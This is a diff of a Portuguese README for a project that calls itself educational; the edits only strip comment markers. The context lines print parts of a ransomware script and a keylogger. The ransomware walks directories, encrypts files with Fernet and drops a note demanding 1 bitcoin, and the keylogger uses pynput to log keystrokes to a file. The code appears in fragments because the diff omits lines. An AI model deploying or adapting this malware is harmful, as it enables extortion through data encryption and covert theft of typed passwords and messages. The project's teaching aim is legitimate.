@@ -19,22 +19,22 @@ O objetivo não é ofensivo, mas sim educacional:
 
 O projeto inclui scripts que simulam o funcionamento básico de um ransomware, criptografando e depois restaurando arquivos usando o módulo cryptography (Fernet).
 
-# 🖥️ Scrip Criptografia:
+🖥️ Scrip Criptografia:
 
 `from cryptography.fernet import Fernet
 import os'
 
-# 1 Gerar uma chave de criptografia e salvar
+ 1 Gerar uma chave de criptografia e salvar
 def gerar_chave():
     chave = Fernet.generate_key()
     with open("chave.key", "wb") as chave_file:
         chave_file.write(chave)
 
-# 2 Carregar a chave salva
+ 2 Carregar a chave salva
 def carregar_chave():
     return open("chave.key", "rb").read()
 
-# 3 Criptografar um único arquivo
+ 3 Criptografar um único arquivo
 def criptografar_arquivo(arquivo, chave):
     f = Fernet(chave)
     with open(arquivo, "rb") as file:
@@ -43,7 +43,7 @@ def criptografar_arquivo(arquivo, chave):
     with open(arquivo, "wb") as file:
         file.write(dados_encriptados)
 
-# 4 Encontrar arquivos para criptografar
+ 4 Encontrar arquivos para criptografar
 def encontrar_arquivos(diretorio):
     lista = []
     for raiz, _, arquivos in os.walk(diretorio):
@@ -53,14 +53,14 @@ def encontrar_arquivos(diretorio):
                 lista.append(caminho)
     return lista
 
-# 5 Mensagem de resgate
+ 5 Mensagem de resgate
 def criar_mensagem_resgate():
     with open("LEIA ISSO.txt", "w") as f:
         f.write("Your files have been hijacked from your machine.\n")
         f.write("To recover it, you need to send 1 bitcoin to account X and send proof of payment.\n")
         f.write("After that, we will send you the key to recover your data.")
 
-# 6 Execução principal:
+6 Execução principal:
 def main():
     gerar_chave()
     chave = carregar_chave()
@@ -137,7 +137,7 @@ Precisa instalar a biblioteca: pip install pynput
 🖥️ Script Keylogger
 from pynput import keyboard
 
-# Teclas que não devem ser registradas
+Teclas que não devem ser registradas:
 IGNORAR = {
     keyboard.Key.shift,
     keyboard.Key.shift_r,
@@ -149,7 +149,7 @@ IGNORAR = {
     keyboard.Key.cmd
 }
 
-# Função chamada sempre que uma tecla é pressionada
+Função chamada sempre que uma tecla é pressionada:
 def on_press(key):
     try:
         # Teclas normais (letras, números, símbolos)
@@ -173,7 +173,7 @@ def on_press(key):
             else:
                 f.write(f"[{key}]")
 
-# Iniciar o listener
+Iniciar o listener:
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
 _________________________________________________________________________________________________________________________________________________
